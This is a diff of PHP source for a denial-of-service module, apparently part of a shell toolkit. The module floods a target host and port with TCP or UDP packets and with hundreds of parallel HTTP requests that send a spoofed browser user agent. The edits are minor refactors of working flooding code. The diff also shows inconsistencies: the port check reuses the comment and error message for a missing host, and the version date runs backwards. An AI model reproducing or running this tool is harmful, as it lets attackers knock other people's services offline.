@@ -147,7 +147,8 @@ class Dos
 	 */
 	public function setType( $sValue )
 	{
-		static $aTypes = array(
+		static $aTypes = array
+		(
 			'tcp',
 			'udp',
 			'http'
@@ -187,7 +188,7 @@ class Dos
 	 */
 	public function setTime( $iValue )
 	{
-		$this -> iTime = (int) $iValue;
+		$this -> iTime = abs( (int) $iValue );
 
 		return $this;
 	}
@@ -226,6 +227,14 @@ class Dos
 		 * Host jest wymagany
 		 */
 		if( $this -> sHost === NULL )
+		{
+			throw new DosException( 'Nie wprowadzono hosta' );
+		}
+
+		/**
+		 * Host jest wymagany
+		 */
+		if( $this -> iPort === 0 )
 		{
 			throw new DosException( 'Nie wprowadzono hosta' );
 		}
@@ -344,6 +353,7 @@ class Dos
 
 		$i = 0;
 		$sPacket = str_repeat( 'x', 1472 );
+
 		do
 		{
 			if( ! fwrite( $rConn, $sPacket ) )
@@ -399,11 +409,11 @@ class Dos
 				CURLOPT_URL             => $this -> sHost,
 				CURLOPT_USERAGENT       => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)',
 				CURLOPT_TIMEOUT         => 5,
-				CURLOPT_RETURNTRANSFER  => 1,
-				CURLOPT_AUTOREFERER	=> 1,
+				CURLOPT_AUTOREFERER	=> TRUE,
 				CURLOPT_LOW_SPEED_LIMIT => 2,
 				CURLOPT_LOW_SPEED_TIME	=> 20,
-				CURLOPT_HTTPHEADER      => array( 'Connection: Keep-Alive' )
+				CURLOPT_HTTPHEADER      => array( 'Connection: Keep-Alive' ),
+				CURLOPT_RETURNTRANSFER  => TRUE
 			);
 
 			do
@@ -417,6 +427,8 @@ class Dos
 					curl_setopt_array( $aCurl[ $j ], $aCurlOpt );
 					curl_multi_add_handle( $aCurlMulti[ $i ], $aCurl[ $j ] );
 				}
+
+				$iRes = 0;
 
 				for( $j = 0; $j < 500; $j++  )
 				{
@@ -550,7 +562,7 @@ class ModuleDos implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.02 2011-10-19 - <krzotr@gmail.com>';
+		return '1.03 2011-01-26 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -624,13 +636,13 @@ DATA;
 				-> get();
 
 			ob_end_flush();
-			exit ;
-
 		}
 		catch( DosException $oException )
 		{
-			return $oException -> getMessage();
+			echo $oException -> getMessage();
 		}
+
+		exit;
 	}
 
 }
